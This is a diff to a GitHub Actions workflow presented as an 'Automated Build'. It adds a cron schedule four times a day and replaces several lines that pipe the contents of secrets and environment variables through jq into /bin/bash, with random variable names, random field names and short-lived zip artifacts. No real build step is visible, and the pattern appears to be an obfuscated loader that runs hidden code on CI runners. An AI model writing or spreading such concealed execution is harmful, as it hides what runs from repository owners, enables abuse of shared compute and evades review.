@@ -2,6 +2,8 @@ name: Automated Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '39 4,10,16,22 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -15,20 +17,16 @@ jobs:
           fetch-depth: 1
       - name: Initialize
         env:
-          gdnee06303: ${{ secrets.gdnee06303 }}
+          o01: ${{ secrets.o01 }}
         run: |
-          printf '%s' "$gdnee06303" | jq -r .bv8 | /bin/bash
-          printf '%s' "$goamm4" | jq -r .qdmn7 | /bin/bash
-          echo $g33251 | jq -r .d28 | /bin/bash
-          printf '%s' "$ear587" | jq -r .umgpf3 | /bin/bash
-          printf '%s' "$ej5" | jq -r .anbs0 | /bin/bash
-          echo $m08628 | jq -r .f46473 | /bin/bash
-          echo $nnc69669 | jq -r .n918 | /bin/bash
+          printf '%s' "$o01" | jq -r .ryw317 | /bin/bash
+          printf '%s' "$cchn44" | jq -r .ubt4857 | /bin/bash
+          echo $d3 | jq -r .i7 | /bin/bash
 
       - name: Persist results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: woJCL4sN
+          name: qJhamW8y
           path: "*.zip"
           retention-days: 1
